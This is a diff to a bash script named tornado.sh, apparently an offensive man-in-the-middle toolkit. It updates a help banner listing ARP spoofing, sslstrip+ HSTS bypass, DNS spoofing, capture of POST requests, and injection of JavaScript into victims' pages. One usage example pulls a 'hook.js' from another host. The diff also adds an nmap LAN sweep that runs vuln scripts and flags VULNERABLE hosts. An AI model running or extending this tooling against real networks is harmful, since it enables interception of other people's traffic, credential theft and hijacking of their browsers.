@@ -8,51 +8,72 @@ date=$(date | awk {'print $4 '})
 resize -s 44 106 2> /dev/null 1> /dev/null
 clear
 echo -e "$white"
-echo -e '                 ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ '"${red}"'██████╗  ██████╗ ' "$white"
-echo -e '                 ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗'"${red}"'██╔══██╗██╔═══██╗'"$white"
-echo -e '                    ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║'"${red}"'██║  ██║██║   ██║'"$white"
-echo -e '                    ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║'"${red}"'██║  ██║██║   ██║'"$white"
-echo -e '                    ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║'"${red}"'██████╔╝╚██████╔╝'"$white"
-echo -e '                    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝'"${red}"'╚═════╝||╚═════╝ '"$white"
-echo -e '                     Version 0.1 [DEMO] - CODED BY MAGDY MOUSTAFA '  "${red}||||       $white"
-echo -e '                     - github.com/rebellionil/tornado          '   "$red|__||||__|    $white"
-echo -e '                     - facebook.com/rebellionil                '   "$red++++++++++    $white"
-echo -e '                                                               '   "$red||||||||||    $white"
-if [[ $1 == "-h" ]] || [[ $7 == "" ]] ; then
+echo -e '                       ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ '"${red}"'██████╗  ██████╗ ' "$white"
+echo -e '                       ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗'"${red}"'██╔══██╗██╔═══██╗'"$white"
+echo -e '                          ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║'"${red}"'██║  ██║██║   ██║'"$white"
+echo -e '                          ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║'"${red}"'██║  ██║██║   ██║'"$white"
+echo -e '                          ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║'"${red}"'██████╔╝╚██████╔╝'"$white"
+echo -e '                          ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝'"${red}"'╚═════╝||╚═════╝ '"$white"
+echo -e '                           Version 0.1 [DEMO] - CODED BY MAGDY MOUSTAFA '  "${red}||||       $white"
+echo -e '                           - github.com/rebellionil/tornado          '   "$red|__||||__|    $white"
+echo -e '                           - facebook.com/rebellionil                '   "$red++++++++++    $white"
+echo -e '                                                                     '   "$red||||||||||    $white"
+if [[ $1 == "-h" ]] || [[ $1 == "" ]] ; then
    echo -e "$blue"
-   echo " ┌══════════════════════════════════════════════════════════════════════════════════════════════════════┐ "
-   echo " █ -h --help         => guess what ?                                                                    █ "
-   echo " █ -t --target       => specify target                                                                  █ "
-   echo " ║ -g --gateway      => specify gateway                                                                 ║ "
-   echo " ║ -i --interface    => specify an interface                                                            ║ "
-   echo " ║ -o --savelog      => save sslstrip+ results                                                          ║ "
-   echo " ║ -f --forward      => forward traffic                                               [ON/off]          ║ "
-   echo " ║ -d --driftnet     => enable driftnet to extract images from session pcap file      [on/OFF]          ║ "
-   echo " ║ -u --urlsnarf     => log GET/POST requests with urlsnarf                           [on/OFF]          ║ "
-   echo " ║ -s --silent       => run arpspoof and dns2proxy in background                      [on/OFF]          ║ "
-   echo " ║ -k --tshark       => capture detailed post requests info with tshark               [on/OFF]          ║ "
-   echo " ║ -e --ettercap     => capture post requests with ettercap (RECOMMENDED)             [on/OFF]          ║ "
-   echo " ║ -m --tcpdump      => capture post requests with TCPdump                            [on/OFF]          ║ "
-   echo " ║ -K --tskark+      => capture GET/POST requests headers with tshark                 [on/OFF]          ║ "
-   echo " ║ -p --dnsspoof     => DNS spoofing with dns2proxy (DOMAIN => FAKE_IP)               [on/OFF]          ║ "
-   echo " ║ -r --iptraf       => monitor network traffic with iptraf-ng                        [on/OFF]          ║ "
-   echo " ║ -a --etherape     => monitor network traffic with etherape                         [on/OFF]          ║ "
-   echo " ║ -x --burp         => intercept captured traffic with burpsuite                                       ║ "
-   echo " ║ -X --mitmproxy    => intercept captured traffic with MITMproxy                                       ║ "
-   echo " ║ -H --hsts         => intercept captured traffic with sslstrip+,dns2proxy                             ║ "
-   echo " ║ -l --js-url       => inject JS url in page content                                                   ║ "
-   echo " ║ -L --js-code      => inject JS code from JS file in page content ( must be one line )                ║ "
-   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.1/24 -g 192.168.1.1 --ettercap --hsts -o ssl.log              ║ "
-   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -f                                          ║ "
-   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -l http://192.168.1.100:3000/hook.js        ║ "
-   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -L alert.js                                 ║ "
-   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.2,192.168.1.5,192.168.1.10 -g 192.168.1.1 --hsts -e -k -d -u  ║ "
-   echo " █ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --burp                                       █ "
-   echo " █ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --dnsspoof dnsfile.txt                       █ "
-   echo " └══════════════════════════════════════════════════════════════════════════════════════════════════════┘ "
+   echo " ┌════════════════════════════════════════════════════════════════════════════════════════════════════════════════┐ "
+   echo " █ -h --help                   => guess what ?                                                                    █ "
+   echo " ║ -I --iface-info             => print connected interfaces information and exit                                 ║ "
+   echo " █ -t --target    <TARGET>     => specify target                                                                  █ "
+   echo " ║ -g --gateway   <Gateway>    => specify gateway                                                                 ║ "
+   echo " ║ -i --interface <iface>      => specify an interface                                                            ║ "
+   echo " ║ -o --savelog   <NAME>       => save sslstrip+ results                                                          ║ "
+   echo " ║ -f --forward   <on/off>     => forward traffic                                               [ON/off]          ║ "
+   echo " ║ -d --driftnet               => enable driftnet to extract images from session pcap file      [on/OFF]          ║ "
+   echo " ║ -u --urlsnarf               => log GET/POST requests with urlsnarf                           [on/OFF]          ║ "
+   echo " ║ -s --silent                 => run arpspoof and dns2proxy in background                      [on/OFF]          ║ "
+   echo " ║ -k --tshark                 => capture detailed post requests info with tshark               [on/OFF]          ║ "
+   echo " ║ -e --ettercap               => capture post requests with ettercap (RECOMMENDED)             [on/OFF]          ║ "
+   echo " ║ -m --tcpdump                => capture post requests with TCPdump                            [on/OFF]          ║ "
+   echo " ║ -K --tskark+                => capture GET/POST requests headers with tshark                 [on/OFF]          ║ "
+   echo " ║ -p --dnsspoof               => DNS spoofing with dns2proxy (DOMAIN => FAKE_IP)               [on/OFF]          ║ "
+   echo " ║ -r --iptraf                 => monitor network traffic with iptraf-ng                        [on/OFF]          ║ "
+   echo " ║ -a --etherape               => monitor network traffic with etherape                         [on/OFF]          ║ "
+   echo " ║ -x --burp                   => intercept captured traffic with burpsuite                                       ║ "
+   echo " ║ -X --mitmproxy              => intercept captured traffic with MITMproxy                                       ║ "
+   echo " ║ -H --hsts                   => intercept captured traffic with sslstrip+,dns2proxy                             ║ "
+   echo " ║ -l --js-url    <js URL>     => inject JS url in page content                                                   ║ "
+   echo " ║ -L --js-code   <js code>    => inject JS code from JS file in page content ( must be one line )                ║ "
+   echo " ║ -M --map-lan   <nmap args>  => perform a nmap network scan from tornado !                                      ║ "
+   echo " ║ eg. ./tornado.sh -I                                                                                            ║ "
+   echo " ║ eg. ./tornado.sh -t 192.168.1.1/24 --map-lan -F                                                                ║ "
+   echo " ║ eg. ./tornado.sh -t 192.168.1.1/24 --map-lan --script vuln -p 80                                               ║ "
+   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.1/24 -g 192.168.1.1 --ettercap --hsts -o ssl.log                        ║ "
+   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -f                                                    ║ "
+   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -l http://192.168.1.100:3000/hook.js                  ║ "
+   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.10 -g 192.168.1.1 -L alert.js                                           ║ "
+   echo " █ eg. ./tornado.sh -i wlan0 -t 192.168.1.2,192.168.1.5,192.168.1.10 -g 192.168.1.1 --hsts -e -k -d -u            █ "
+   echo " ║ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --burp                                                 ║ "
+   echo " █ eg. ./tornado.sh -i wlan0 -t 192.168.1.5 -g 192.168.1.1 --dnsspoof dnsfile.txt                                 █ "
+   echo " └════════════════════════════════════════════════════════════════════════════════════════════════════════════════┘ "
    exit
 fi
 #############################################################################################################
+if [[ $1 == '-I' ]] || [[ $1 == '--iface-info' ]] ; then
+   for i in $( ifconfig | awk {'print $1 '} | grep : | cut -d ':' -f 1 | grep -v lo ) ; do
+      if [[ $( ifconfig $i | grep inet ) == "" ]] ; then
+         continue
+      else
+         echo -e "${yellow}══════════════════════════════"
+         echo -ne "${red}█${yellow}"
+         interface=$i
+         class=$(ip -d route | grep $interface | grep / | awk {' print $2 '} | cut -d '/' -f2)
+         ifconfig $interface | grep -e $interface -e ether -e inet | grep -v inet6 | cut -d 'f' -f 1 | sed "s/$interface:/|||| $interface/g" | sed 's/  /\n/g' | uniq -u | grep -ve txqueuelen -ve Ethernet | sed 's/inet/Local-IP/g' | sed 's/netmask/Subnetmask/g' | sed 's/broadcast/Broadcast/g' | sed 's/ether/MAC-address/g' | column -ts ' ' | sed 's/|//g' | sed "s/$interface/${interface}\/${class}\n/g"
+         echo ""
+      fi
+   done
+   echo "══════════════════════════════"
+   exit
+fi
 inpt=$( echo "$1 $2 $3 $4 $5 $6 $7 $8 $9 ${10} ${11} ${12} ${13} ${14} ${15} ${16} ${17} ${18} ${19} ${20}" )
 if [[ $( echo $inpt | grep -w '\-i' ) =~ '-i' ]] || [[ $inpt == '--interface' ]] ; then
    interface=$( echo $inpt | sed 's/ /\n/g' | grep -e '-i' -e '--interface' -A 1 | awk NR==2 )
@@ -66,7 +87,47 @@ else
    echo -e "${red}█ specify target(s)"
    exit
 fi
-if [[ $inpt =~ '-g' ]] || [[ $inpt == '--gateway'   ]] ; then
+
+if [[ $inpt =~ '-M' ]] || [[ $inpt =~ '--map-lan' ]] ; then
+   arg=$( echo $inpt | sed 's/-M/Q/g' | sed 's/--map-lan/Q/g' )
+   args=$( echo $arg | cut -d 'Q' -f2 )
+   if [[ -d .workspace ]] ; then rm -rf .workspace ; fi
+   mkdir .workspace ; cd .workspace
+   nmap -sn $target  > nmap.txt
+   cat nmap.txt | grep -e "Nmap scan"   | awk {' print $5 '} > ips.txt
+   cat nmap.txt | grep -e "MAC Address" | awk {' print $3 '} > macs.txt
+   cat nmap.txt | grep -e "MAC Address" | awk {' print $4" "$5" "$6" "$7" "$8'} > vendors.txt
+   for i in $( cat ips.txt ) ; do
+      echo $i >> nmp.txt
+      nmap $i $args | grep -e "open" -e "\|" | grep -ve "Nmap" -e "latency" -e "   STATE" -e "MAC Address:" -e "nmap.org" >> nmp.txt
+   done
+   x=1
+   cat nmp.txt | while read i ; do
+      if [[ $i == $( cat ips.txt | awk NR==$x ) ]] && [[ $i != "" ]] ; then
+         local_ip=$(ifconfig $interface | grep "inet " | awk {' print $2 '})
+         mac_addr=$(ifconfig $interface | grep "ether" | awk {' print $2 '})
+         if [[ $i =~ $local_ip ]] ; then
+            echo -e "${red}█ ${blue}$local_ip \t ${yellow}$mac_addr \t ${green}(You)"
+         else
+            echo -e "${red}█ $blue`cat ips.txt | awk NR==$x` \t $yellow`cat macs.txt | awk NR==$x` ${green}`cat vendors.txt | awk NR==$x`"
+         fi
+         let x=$x+1
+      else
+         if [[ $i =~ '|' ]] ; then
+            if [[ $i =~ "VULNERABLE" ]] ; then
+              ii=$(echo $i | sed 's/VULNERABLE/\\e[1;31m VULNERABLE/g')
+              echo -e "${green}        ║__ $purp $ii"
+            else
+              echo -e "${green}        ║__ $purp $i"
+            fi
+         else
+            echo -e "${green}     ║ $white $i"
+         fi
+      fi
+   done
+   exit
+fi
+if [[ $inpt =~ '-g' ]] || [[ $inpt =~ '--gateway' ]] ; then
    gateway=$( echo $inpt | sed 's/ /\n/g' | grep -e '-g' -e '--gateway' -A 1 | awk NR==2 )
 else
    echo -e "${red}█ specify gateway"
@@ -101,6 +162,7 @@ else
    myip=$(ip -d route | grep wlan0 | grep -e /24 -e /16 | awk {' print $10 '})
 fi
 ############################################################################################################
+
 cd "${date}_output"
 echo -e "${red}█ Interface $interface"
 echo -e "█ Local IP $myip"
